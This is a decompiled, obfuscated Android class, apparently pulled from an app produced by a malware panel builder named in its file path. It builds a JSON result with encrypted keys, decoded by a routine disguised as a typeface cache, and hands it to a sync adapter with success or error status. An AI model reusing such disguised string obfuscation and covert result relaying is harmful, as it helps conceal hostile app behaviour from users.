package v.s;

import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class sjWVYxwWEV0DK extends jh03IwKTfxTtT1U implements NhN5GSKLYh6STld4 {
    public final /* synthetic */ String D5P1xCAyuvgF;
    public final /* synthetic */ ubmqYDSfxvxS b1EoSIRjJHO5;
    public final /* synthetic */ JSONObject hjneShqpF9Tis4;
    public final /* synthetic */ SyncQYAdapter ibVTtJUNfrGYbW;
    public final /* synthetic */ String pyu8ovAipBTLYAiKab;
    public int xDyLpEZyrcKVe0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public sjWVYxwWEV0DK(SyncQYAdapter syncQYAdapter, ubmqYDSfxvxS ubmqydsfxvxs, String str, String str2, JSONObject jSONObject, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        super(2, b9xroaxfr1fmoo2q);
        this.ibVTtJUNfrGYbW = syncQYAdapter;
        this.b1EoSIRjJHO5 = ubmqydsfxvxs;
        this.pyu8ovAipBTLYAiKab = str;
        this.D5P1xCAyuvgF = str2;
        this.hjneShqpF9Tis4 = jSONObject;
    }

    @Override // v.s.NhN5GSKLYh6STld4
    public final Object b1EoSIRjJHO5(Object obj, Object obj2) {
        return ((sjWVYxwWEV0DK) dDIMxZXP1V8HdM((wh3Lv6S5rs6zqjV) obj, (b9xRoaXFR1fmOO2Q) obj2)).vekpFI4d1Nc4fakF(Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM);
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final b9xRoaXFR1fmOO2Q dDIMxZXP1V8HdM(Object obj, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        return new sjWVYxwWEV0DK(this.ibVTtJUNfrGYbW, this.b1EoSIRjJHO5, this.pyu8ovAipBTLYAiKab, this.D5P1xCAyuvgF, this.hjneShqpF9Tis4, b9xroaxfr1fmoo2q);
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final Object vekpFI4d1Nc4fakF(Object obj) throws Throwable {
        int i = this.xDyLpEZyrcKVe0;
        ubmqYDSfxvxS ubmqydsfxvxs = this.b1EoSIRjJHO5;
        String str = this.pyu8ovAipBTLYAiKab;
        try {
            if (i == 0) {
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                JSONObject jSONObject = new JSONObject();
                String str2 = this.D5P1xCAyuvgF;
                JSONObject jSONObject2 = this.hjneShqpF9Tis4;
                jSONObject.put("id", str);
                jSONObject.put(TypefaceCache.obtain("002000790056008A00F100B100D6"), str2);
                jSONObject.put(TypefaceCache.obtain("003300770049008600FD00AC"), jSONObject2);
                SyncQYAdapter syncQYAdapter = this.ibVTtJUNfrGYbW;
                this.xDyLpEZyrcKVe0 = 1;
                String str3 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                Object objJ0zjQ7CAgohuxU20eCW6 = syncQYAdapter.J0zjQ7CAgohuxU20eCW6(jSONObject, this);
                pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
                if (objJ0zjQ7CAgohuxU20eCW6 == pjn1l01kdmwnpcy0dad) {
                    return pjn1l01kdmwnpcy0dad;
                }
            } else {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
            }
            ubmqydsfxvxs.dDIMxZXP1V8HdM(str, Boolean.TRUE, null);
        } catch (Exception e) {
            Boolean bool = Boolean.FALSE;
            JSONObject jSONObject3 = new JSONObject();
            String strObtain = TypefaceCache.obtain("002600640049008800E2");
            String message = e.getMessage();
            if (message == null) {
                message = TypefaceCache.obtain("003600780050008900FF00A800DC");
            }
            ubmqydsfxvxs.dDIMxZXP1V8HdM(str, bool, jSONObject3.put(strObtain, message));
        }
        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
    }
}
